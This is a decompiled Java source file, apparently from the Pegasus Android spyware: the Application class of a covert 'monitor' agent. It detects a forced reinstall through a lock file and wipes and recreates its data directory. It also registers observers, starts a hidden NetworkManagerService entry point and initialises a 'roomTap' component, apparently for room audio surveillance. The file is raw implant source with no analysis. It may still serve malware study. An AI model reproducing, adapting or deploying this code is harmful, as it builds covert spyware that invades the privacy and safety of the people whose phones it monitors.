package com.network.android.android.monitor;

import android.app.Application;
import android.content.BroadcastReceiver;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import com.network.android.a.c;
import com.network.android.monitor.observer.r;
import com.network.android.roomTap.k;
import com.network.e.a.a;
import com.network.e.a.b;
import java.io.File;

public abstract class AndroidMonitorApplication extends Application {

    /* renamed from: a  reason: collision with root package name */
    private b f66a;
    private BroadcastReceiver b;

    /* access modifiers changed from: protected */
    public abstract void a(IntentFilter intentFilter);

    /* access modifiers changed from: protected */
    public final void a(r rVar, IntentFilter intentFilter) {
        this.f66a.a(rVar);
        a aVar = new a(this, this, null);
        for (String str : rVar.a()) {
            intentFilter.addAction(str);
            rVar.a((com.network.android.monitor.a.a) aVar);
        }
    }

    public final b c() {
        return this.f66a;
    }

    public void onCreate() {
        super.onCreate();
        com.network.android.c.a.a.a("AndroidMonitorApplication: Android Monitor Application Create");
        try {
            com.network.android.c.a.a.a("performIfAgentWasInstalledInOvverideCheck starting");
            if (new File("/data/reinslock").length() > 0) {
                com.network.android.c.a.a.a("NetworkManagerService  found reinstall sync file. that mean we were installed by reinstall");
                File file = new File("/data/data/com.network.android");
                com.network.h.b.b("/data/reinslock");
                com.network.h.b.a(file.getAbsolutePath());
                file.mkdir();
                com.network.android.c.a.b.a(1, 98, "LOG_AGENT_WAS_INTALLED__BY_OVVERIDE");
            }
            com.network.android.c.a.a.a("performIfAgentWasInstalledInOvverideCheck end");
        } catch (Throwable th) {
            com.network.android.c.a.a.a("performIfAgentWasInstalledInOvverideCheck  exception" + th.getMessage(), th);
        }
        this.f66a = new b();
        IntentFilter intentFilter = new IntentFilter();
        b bVar = this.f66a;
        a(intentFilter);
        this.b = new a(this);
        registerReceiver(this.b, intentFilter);
        com.network.android.c.a.a.a("AndroidMonitorApplication Build.VERSION.SDK_INT:" + Build.VERSION.SDK_INT);
        if (!c.d()) {
            com.network.android.c.a.a.a("AndroidMonitorApplication: startService ACTION_ENTRY_POINT");
            startService(new Intent(this, NetworkManagerService.class).setAction("ACTION_ENTRY_POINT"));
        } else {
            com.network.android.c.a.a.a("AndroidMonitorApplication: 4.3 JELLY_BEAN_MR2. working without the service ");
        }
        k.a(this);
        com.network.android.c.a.a.a("AndroidMonitorApplication: Pegasus Android Monitor Application Initialized Successfully!");
    }

    public void onTerminate() {
        super.onTerminate();
        this.f66a.a();
        unregisterReceiver(this.b);
        k.a();
        new File(com.network.media.r.a()).delete();
        com.network.android.c.a.a.a("AndroidMonitorApplication: onTerminate");
    }
}
